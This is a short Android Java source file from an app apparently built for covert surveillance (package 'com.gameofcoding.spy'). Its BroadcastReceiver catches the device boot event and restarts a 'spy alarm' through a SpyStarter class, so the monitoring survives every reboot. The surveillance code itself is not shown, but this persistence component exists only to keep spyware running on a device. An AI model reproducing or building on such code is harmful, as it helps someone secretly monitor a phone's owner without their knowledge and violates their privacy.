package com.gameofcoding.spy.receivers;

import android.content.BroadcastReceiver;
import android.content.Context; 
import android.content.Intent;
import com.gameofcoding.spy.spys.SpyStarter;
import com.gameofcoding.spy.utils.XLog;

/**
 * Received when device gets booted
 */
public class BootCompleteReceiver extends BroadcastReceiver {
    private static final String TAG = "BootCompleteReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
	if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
	    XLog.i(TAG, "Boot completed, restarting spy alarm");
	    new SpyStarter(context).start();
	} else { XLog.w(TAG, "Unknown broadcast, " + intent.toString()); }
    }
}
